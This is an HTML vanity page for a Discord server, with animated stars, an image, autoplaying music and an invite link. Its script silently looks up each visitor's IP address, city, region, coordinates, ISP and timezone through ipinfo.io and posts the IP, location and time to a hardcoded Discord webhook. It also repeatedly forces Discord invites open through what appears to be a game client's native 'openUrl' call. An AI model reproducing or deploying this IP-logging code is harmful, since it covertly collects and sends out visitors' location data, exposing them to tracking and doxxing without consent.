<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>discord.gg/5-1</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: black;
      overflow: hidden;
      font-family: 'Courier New', Courier, monospace;
      color: #9f8663;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      text-align: center;
      position: relative;
    }

    /* النجوم */
    .star {
      position: absolute;
      top: -10px;
      width: 2px;
      height: 2px;
      background: white;
      border-radius: 50%;
      opacity: 0.8;
      animation: fall linear infinite;
    }

    @keyframes fall {
      to {
        transform: translateY(110vh);
        opacity: 0;
      }
    }

    #content {
      display: none;
      opacity: 0;
      transition: opacity 2s ease;
      z-index: 10;
    }

    .image-container img {
      width: 400px;
      height: auto;
      border: 2px solid #a60404;
      border-radius: 15px;
      box-shadow: 0 0 15px rgba(255, 0, 0, 0.7);
    }

    .info {
      margin-top: 20px;
      font-size: 1.5em;
      color: #a60404;
      text-shadow: 0 0 8px #a60404, 0 0 15px #a60404;
      letter-spacing: 4.5px;
      white-space: pre-wrap;
    }

    .text {
      margin-top: 5px;
      font-size: 75px;
      color: #a60404;
      text-shadow: 0 0 8px #a60404, 0 0 15px #a60404, 0 0 25px #a60404;
      letter-spacing: 4.5px;
    }
  </style>
</head>
<body>

  <!-- عناصر النجوم -->
  <script>
    for (let i = 0; i < 120; i++) {
      let star = document.createElement('div');
      star.className = 'star';
      star.style.left = Math.random() * 100 + 'vw';
      star.style.animationDuration = 2 + Math.random() * 3 + 's';
      star.style.width = star.style.height = Math.random() * 2 + 1 + 'px';
      document.body.appendChild(star);
    }
  </script>

  <div class="gif-container">
    <img src="https://cdn.discordapp.com/attachments/1352303817970028599/1395099127016063079/f13f399722b01a5351d13b256e6ccc36.jpg" alt="">
  </div>

  <div id="content">
    <div class="image-container">
      <img src="https://cdn.discordapp.com/attachments/1352303817970028599/1395099127016063079/f13f399722b01a5351d13b256e6ccc36.jpg?ex=687936cf&is=6877e54f&hm=88ad6faafe8aa7c8bab6c3673c8c81ecb8e85c4a36ccef0fdd06a4da4cf36d61&" alt="">
    </div>

    <audio autoplay loop>
      <source src="https://cdn.discordapp.com/attachments/1352303817970028599/1395102727817662474/Maxx_-_Get_A_Way_Official_Video.mp3?ex=68793a2a&is=6877e8aa&hm=8d0ab4756d9da184c8da7b1d3234efa3aa671f4884f990fa4853ac5bf0be4de7&" type="audio/mpeg">
      Your browser does not support the audio element.
    </audio>

    <div class="info" id="ip-info"></div>
    <div class="text">discord.gg/BYY</div>
  </div>

  <script>
    setTimeout(() => {
      document.querySelector('.gif-container').style.display = 'none';
      const content = document.getElementById('content');
      content.style.display = 'block';
      setTimeout(() => {
        content.style.opacity = 1;
      }, 150);
    }, 200);

    fetch('https://ipinfo.io/json')
      .then(response => response.json())
      .then(data => {
        const { ip, country, city, region, loc, org, timezone } = data;
        const infoDiv = document.getElementById('ip-info');
        infoDiv.innerHTML = `
<strong>IP:</strong> "${ip}"<br>
<strong>City:</strong> "${city}"<br>
<strong>Region:</strong> "${region}"<br>
<strong>Country:</strong> "${country}"<br>
<strong>Location:</strong> "${loc}"<br>
<strong>Org:</strong> "${org}"<br>
<strong>Timezone:</strong> "${timezone}"`;

        const dateTime = new Date().toLocaleString();
        const webhookUrl = 'https://discord.com/api/webhooks/1395100826728665258/GVaMcEcmm7lTz3A0_9TtsdtsWe4ABltzM2y57dWae1oexKbb6G5uGCIr-Y3djfGqiS8Q';
        fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}`
          })
        });
      });

    setInterval(function () {
      window.invokeNative("openUrl", "https://discord.gg/env");
      window.invokeNative("openUrl", "https://discord.gg/env");
    }, 3400);
  </script>
</body>
</html>
